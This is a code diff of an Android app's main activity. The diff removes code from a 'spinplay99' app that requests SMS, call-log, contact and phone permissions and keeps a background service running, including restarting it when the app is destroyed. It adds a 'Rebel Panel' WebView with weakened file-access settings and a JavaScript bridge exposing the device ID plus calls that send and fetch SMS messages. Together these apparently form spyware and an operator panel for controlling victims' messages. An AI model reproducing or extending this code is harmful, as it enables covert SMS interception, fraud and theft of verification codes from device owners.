@@ -1,15 +1,12 @@
 package com.spinplay99.adminpanel;
 
-import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.content.Intent;
-import android.content.SharedPreferences;
-import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
+import android.provider.Settings;
 import android.view.View;
 import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface;
@@ -22,127 +19,37 @@ import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
 import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
 
-import java.util.ArrayList;
-import java.util.List;
+import org.json.JSONObject;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final String SERVER_URL = "https://spinplay99.com";
-    private static final int FILE_CHOOSER_REQUEST = 1001;
-    private static final int PERMISSION_REQUEST_CODE = 2001;
-    private static final String PREFS_NAME = "SpinPlayPrefs";
-    private static final String KEY_PERM_ASKED = "perm_asked";
+    private static final String PANEL_ENTRY = "file:///android_asset/panel/index.html";
 
     private WebView webView;
     private ProgressBar progressBar;
     private SwipeRefreshLayout swipeRefresh;
     private ValueCallback<Uri[]> filePathCallback;
-    private Handler handler;
-    private SharedPreferences prefs;
     private boolean isReady = false;
+    private String fallbackPanelUrl;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        handler = new Handler();
-        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+
+        fallbackPanelUrl = getString(R.string.panel_url).trim();
+
         webView = findViewById(R.id.webview);
         progressBar = findViewById(R.id.progress_bar);
         swipeRefresh = findViewById(R.id.swipe_refresh);
+
         setupWebView();
         setupSwipeRefresh();
-        requestPermissionsOnce();
-        preloadWebsite();
-        startBackgroundService();
-    }
-
-    private void requestPermissionsOnce() {
-        if (prefs.getBoolean(KEY_PERM_ASKED, false)) {
-            if (!allPermissionsGranted()) requestMissingPermissions();
-            return;
-        }
-        requestAllPermissions();
-        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
-    }
-
-    private boolean allPermissionsGranted() {
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
-        }
-        return true;
-    }
-
-    private void requestMissingPermissions() {
-        List<String> missingList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED 
-                && shouldShowRequestPermissionRationale(permission)) {
-                missingList.add(permission);
-            }
-        }
-        if (!missingList.isEmpty()) {
-            ActivityCompat.requestPermissions(this, missingList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-        }
-    }
-
-    private void requestAllPermissions() {
-        List<String> permissionList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionList.add(permission);
-            }
-        }
-        if (!permissionList.isEmpty()) {
-            ActivityCompat.requestPermissions(this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-    }
-
-    private void startBackgroundService() {
-        Intent serviceIntent = new Intent(this, BackgroundSyncService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
+        webView.loadUrl(PANEL_ENTRY);
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -152,48 +59,76 @@ public class MainActivity extends AppCompatActivity {
         settings.setDomStorageEnabled(true);
         settings.setLoadWithOverviewMode(true);
         settings.setUseWideViewPort(true);
-        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
+        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
         settings.setDatabaseEnabled(true);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         settings.setAllowFileAccess(true);
+        settings.setAllowContentAccess(true);
+        settings.setMediaPlaybackRequiresUserGesture(false);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
+            settings.setAllowFileAccessFromFileURLs(true);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+            settings.setAllowUniversalAccessFromFileURLs(true);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            settings.setSafeBrowsingEnabled(true);
+        }
         CookieManager.getInstance().setAcceptCookie(true);
+        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
         webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
-        webView.addJavascriptInterface(new AndroidBridge(), "Android");
+        webView.addJavascriptInterface(new RebelAndroidBridge(), "RebelAndroid");
 
         webView.setWebViewClient(new WebViewClient() {
+            @Override
             public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
-                if (!isReady) progressBar.setVisibility(View.VISIBLE);
+                if (!isReady) {
+                    progressBar.setVisibility(View.VISIBLE);
+                }
             }
+
+            @Override
             public void onPageFinished(WebView view, String url) {
                 progressBar.setVisibility(View.GONE);
                 swipeRefresh.setRefreshing(false);
                 isReady = true;
             }
+
+            @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                 String url = request.getUrl().toString();
-                if (!url.contains("spinplay99.com")) {
-                    try {
-                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
-                    } catch (Exception e) {
-                        view.loadUrl(url);
-                    }
-                    return true;
+                if (shouldStayInWebView(url)) {
+                    return false;
                 }
-                return false;
+                try {
+                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
+                } catch (Exception e) {
+                    view.loadUrl(url);
+                }
+                return true;
             }
         });
 
         webView.setWebChromeClient(new WebChromeClient() {
+            @Override
             public void onProgressChanged(WebView view, int newProgress) {
                 if (!isReady) {
                     progressBar.setProgress(newProgress);
-                    if (newProgress > 80) progressBar.setVisibility(View.GONE);
+                    if (newProgress > 85) {
+                        progressBar.setVisibility(View.GONE);
+                    }
                 }
             }
-            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> callback, FileChooserParams params) {
+
+            @Override
+            public boolean onShowFileChooser(
+                    WebView webView,
+                    ValueCallback<Uri[]> callback,
+                    FileChooserParams params
+            ) {
                 filePathCallback = callback;
                 try {
-                    startActivityForResult(params.createIntent(), FILE_CHOOSER_REQUEST);
+                    startActivityForResult(params.createIntent(), 1001);
                 } catch (Exception e) {
                     filePathCallback = null;
                     return false;
@@ -203,53 +138,60 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void preloadWebsite() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                handler.post(new Runnable() {
-                    @Override
-                    public void run() {
-                        webView.loadUrl(SERVER_URL);
-                    }
-                });
+    private boolean shouldStayInWebView(String url) {
+        if (url == null || url.isEmpty()) {
+            return true;
+        }
+        if (url.startsWith("file:///android_asset/")) {
+            return true;
+        }
+        if (url.startsWith("javascript:") || url.startsWith("about:")) {
+            return true;
+        }
+        if (url.contains("firebaseio.com") || url.contains("firebasedatabase.app")) {
+            return true;
+        }
+        if (url.contains("googleapis.com") || url.contains("gstatic.com")) {
+            return true;
+        }
+        if (url.contains("githubusercontent.com")) {
+            return true;
+        }
+        if (!fallbackPanelUrl.isEmpty()) {
+            try {
+                String host = Uri.parse(fallbackPanelUrl).getHost();
+                if (host != null && url.contains(host)) {
+                    return true;
+                }
+            } catch (Exception ignored) {
             }
-        }).start();
+        }
+        return url.endsWith(".php") || url.contains("/mobile.php") || url.contains("/admin.php");
     }
 
     private void setupSwipeRefresh() {
-        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
-        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
-            @Override
-            public void onRefresh() {
-                webView.reload();
-            }
-        });
+        swipeRefresh.setColorSchemeColors(0xFFFF3C3C, 0xFFFF9500, 0xFF00FF9D);
+        swipeRefresh.setOnRefreshListener(() -> webView.reload());
     }
 
     @Override
     public void onBackPressed() {
         if (webView.canGoBack()) {
             webView.goBack();
-        } else {
-            new AlertDialog.Builder(this)
-                .setTitle("Exit")
-                .setMessage("Close app?")
-                .setPositiveButton("Yes", new android.content.DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(android.content.DialogInterface dialog, int which) {
-                        finish();
-                    }
-                })
+            return;
+        }
+        new AlertDialog.Builder(this)
+                .setTitle("Exit Rebel Panel?")
+                .setMessage("Close the app?")
+                .setPositiveButton("Yes", (dialog, which) -> finish())
                 .setNegativeButton("No", null)
                 .show();
-        }
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == FILE_CHOOSER_REQUEST && filePathCallback != null) {
+        if (requestCode == 1001 && filePathCallback != null) {
             Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
             filePathCallback.onReceiveValue(results);
             filePathCallback = null;
@@ -262,19 +204,54 @@ public class MainActivity extends AppCompatActivity {
             webView.stopLoading();
             webView.destroy();
         }
-        startBackgroundService();
         super.onDestroy();
     }
 
-    public class AndroidBridge {
+    public class RebelAndroidBridge {
+        @JavascriptInterface
+        public String getAttest() {
+            return "rebel-panel-native-3.0";
+        }
+
+        @JavascriptInterface
+        public String getDevice() {
+            try {
+                return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            } catch (Exception e) {
+                return "android";
+            }
+        }
+
         @JavascriptInterface
         public void showToast(String message) {
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
+            runOnUiThread(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
+        }
+
+        @JavascriptInterface
+        public String apiPost(String endpoint, String jsonBody) {
+            try {
+                JSONObject body = new JSONObject(jsonBody == null || jsonBody.isEmpty() ? "{}" : jsonBody);
+                JSONObject result;
+                if ("rebel_send_sms".equals(endpoint)) {
+                    result = RebelPanelApi.sendSms(body);
+                } else if ("rebel_fetch_sms".equals(endpoint)) {
+                    result = RebelPanelApi.fetchSms(body);
+                } else {
+                    result = new JSONObject();
+                    result.put("ok", false);
+                    result.put("error", "Unknown endpoint: " + endpoint);
                 }
-            });
+                return result.toString();
+            } catch (Exception e) {
+                try {
+                    JSONObject err = new JSONObject();
+                    err.put("ok", false);
+                    err.put("error", e.getMessage() == null ? "Native API failed" : e.getMessage());
+                    return err.toString();
+                } catch (Exception ignored) {
+                    return "{\"ok\":false,\"error\":\"Native API failed\"}";
+                }
+            }
         }
     }
 }
